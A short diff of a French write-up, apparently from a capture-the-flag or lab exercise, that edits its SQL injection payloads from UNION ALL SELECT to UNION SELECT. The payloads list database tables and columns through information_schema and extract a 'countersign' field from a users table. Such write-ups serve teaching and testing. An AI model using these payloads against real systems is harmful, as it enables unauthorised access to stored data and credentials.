@@ -27,7 +27,7 @@ on en deduis le nom de la db: Member_Sql_Injection
 
 ```sql
 1 UNION SELECT * FROM Users
-1 AND 1=2 UNION ALL SELECT * FROM information_schema.columns
+1 AND 1=2 UNION SELECT * FROM information_schema.columns
 ```
 
 Nous avons une erreur:
@@ -38,7 +38,7 @@ c'est pourquoi lorsque nous avons essayé d'unir plus de 2 colonnes avec elle, n
 
 En essayant de select que deux colonnes avec cette commande:
 ```sql
-1 AND 1=2 UNION ALL SELECT table_name, column_name FROM information_schema.columns
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 
 Nous affiche toutes les tables et colonnes
@@ -56,7 +56,7 @@ countersign
 testons alors les deux dernieres qui ont l'air suspectes.... :
 
 ```sql
-1 AND 1 = 2 UNION ALL SELECT countersign, Commentaire FROM users
+1 AND 1 = 2 UNION SELECT countersign, Commentaire FROM users
 ```
 bingo !
 
